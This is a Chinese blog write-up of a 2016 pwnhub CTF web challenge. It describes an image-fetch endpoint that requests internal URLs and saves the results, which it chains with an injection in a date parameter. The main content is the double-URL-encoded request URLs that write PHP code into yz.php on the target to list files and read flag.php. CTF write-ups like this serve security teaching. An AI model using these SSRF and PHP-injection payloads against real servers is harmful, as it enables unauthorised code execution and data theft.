---
title: pwnhub——胖哈勃外传-第一集 writeup
tags: [write-up]
date: 2016-12-18 00:10
---
第一步 查找漏洞查看漏洞  找了半天发现 源码中有一部分如下图   点击出现console.log('logo.jpg update sucess!')查看http://54.223.2
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><h1 id="第一步-查找漏洞">第一步 查找漏洞</h1>
<p>查看漏洞 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161217234634686?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
找了半天发现 源码中有一部分如下图</br></img></br></p>
<pre class="prettyprint"><code class=" hljs xml">   <span class="hljs-tag">&lt;<span class="hljs-title">script</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">"http://54.223.231.220/image.php?file=http://127.0.0.1:8888/test.png&amp;path=logo.jpg"</span>&gt;</span><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span></code></pre>
<p>点击出现</p>
<pre class="prettyprint"><code class=" hljs rust">console.<span class="hljs-keyword">log</span>(<span class="hljs-string">'logo.jpg update sucess!'</span>)
查看http:<span class="hljs-comment">//54.223.231.220/logo.jpg发现二维码</span>
说明url将<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8888</span>/test.png二维码存至logo.jpg下
典型的csrf跨站点请求访问</code></pre>
<p>下面就要利用这个漏洞了</p>
<h1 id="第二步-再查找漏洞">第二步 再查找漏洞</h1>
<p>我们发现</p>
<pre class="prettyprint"><code class=" hljs xml">   <span class="hljs-tag">&lt;<span class="hljs-title">script</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">"http://54.223.231.220/image.php?file=http://127.0.0.1:8888/test.png&amp;path=logo.jpg"</span>&gt;</span><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span></code></pre>
<p>没有什么利用的价值，我们容易伪造请求 <br>
那么继续找漏洞</br></p>
<pre class="prettyprint"><code class=" hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">54.223</span><span class="hljs-number">.231</span><span class="hljs-number">.220</span>/?<span class="hljs-built_in">date</span>/<span class="hljs-number">2016</span>-<span class="hljs-number">07</span>/</code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20161217235328575?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
我们将url改为 <br>
<a href="http://54.223.231.220/?date/2016-07%3Cb%3Eyz%3C/b%3E/">http://54.223.231.220/?date/2016-07%3Cb%3Eyz%3C/b%3E/</a> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161217235702327?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
至此 ，我们可以伪造请求了</br></img></br></br></br></img></p>
<h1 id="第三步-伪造请求">第三步 伪造请求</h1>
<pre class="prettyprint"><code class=" hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">54.223</span>.<span class="hljs-number">231.220</span>/image.php?file=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8888</span>/?date/<span class="hljs-number">2016</span>-<span class="hljs-number">07</span>&lt;?php <span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">glob</span>(<span class="hljs-string">"./<span class="hljs-variable">*"</span>) as <span class="hljs-variable">$i</span>) {echo <span class="hljs-variable">$i</span>;}?&gt;/&amp;path=yz.php
//注意二次编码为
http://54.223.231.220/image.php?file=http://127.0.0.1:8888/?date/2016-07<span class="hljs-variable">%253c</span><span class="hljs-variable">%253fphp</span><span class="hljs-variable">%2520foreach</span>(glob(<span class="hljs-variable">%2522</span>.<span class="hljs-variable">%252f</span><span class="hljs-variable">*%</span>2522)<span class="hljs-variable">%2520as</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2524i</span>)<span class="hljs-variable">%2520</span><span class="hljs-variable">%257becho</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2524i</span><span class="hljs-variable">%253b</span><span class="hljs-variable">%257d</span><span class="hljs-variable">%253f</span><span class="hljs-variable">%253e</span>/&amp;path=yz.php</span></code></pre>
<p>得到 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161218000419329?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
发现flag.php <br>
现在把他读出来</br></br></img></br></p>
<pre class="prettyprint"><code class=" hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">54.223</span><span class="hljs-number">.231</span><span class="hljs-number">.220</span>/image.php?<span class="hljs-built_in">file</span>=<span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8888</span>/?<span class="hljs-built_in">date</span>/<span class="hljs-number">2016</span>-<span class="hljs-number">07</span><span class="hljs-preprocessor">&lt;?</span>php echo file_get_contents(<span class="hljs-string">'flag.php'</span>)<span class="hljs-preprocessor">?&gt;</span>/&amp;path=yz.php
二次编码为
<span class="hljs-keyword">http</span>://<span class="hljs-number">54.223</span><span class="hljs-number">.231</span><span class="hljs-number">.220</span>/image.php?<span class="hljs-built_in">file</span>=<span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8888</span>/?<span class="hljs-built_in">date</span>/<span class="hljs-number">2016</span>-<span class="hljs-number">07</span>%<span class="hljs-number">253</span>c%<span class="hljs-number">253</span>fphp%<span class="hljs-number">2</span>becho%<span class="hljs-number">2</span>bfile_get_contents(%<span class="hljs-number">2527</span>flag.php%<span class="hljs-number">2527</span>)%<span class="hljs-number">253</span>f%<span class="hljs-number">253</span>e/&amp;path=yz.php</code></pre>
<p>得到 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161218000938154?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p></div>